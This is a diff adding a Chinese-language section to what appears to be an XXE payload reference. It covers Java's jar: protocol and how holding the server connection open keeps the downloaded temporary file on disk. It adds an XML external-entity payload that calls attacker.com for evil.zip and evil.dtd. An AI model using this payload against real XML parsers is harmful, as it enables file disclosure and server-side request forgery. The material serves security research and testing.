@@ -455,3 +455,22 @@ jar协议只能在Java 应用程序中访问。它旨在支持PKZIP存档（例�
 
 + jar:file:///var/myarchive.zip!/file.txt
 + jar:https://download.host.com/myarchive.zip!/file.txt
+
+通过 jar 协议访问 PKZIP 存档中的文件的过程涉及几个步骤：
+
++ 1. 发出 HTTP 请求以从指定位置（例如 .zip）下载 zip 存档https://download.website.com/archive.zip。
+
++ 2. 包含存档的 HTTP 响应临时存储在系统上，通常存储在诸如/tmp/....
+
++ 3. 然后提取存档以访问其内容。
+
++ 4. file.zip读取存档中的特定文件。
+
++ 5. 操作完成后，在此过程中创建的所有临时文件都将被删除。
+
+在第二步中断此过程的一个有趣的技术是在提供存档文件时无限期地保持服务器连接打开。此存储库中提供的工具可用于此目的，包括 Python 服务器 ( slow_http_server.py) 和 Java 服务器 ( slowserver.jar)。
+
+```XML
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
+<foo>&xxe;</foo>
+```
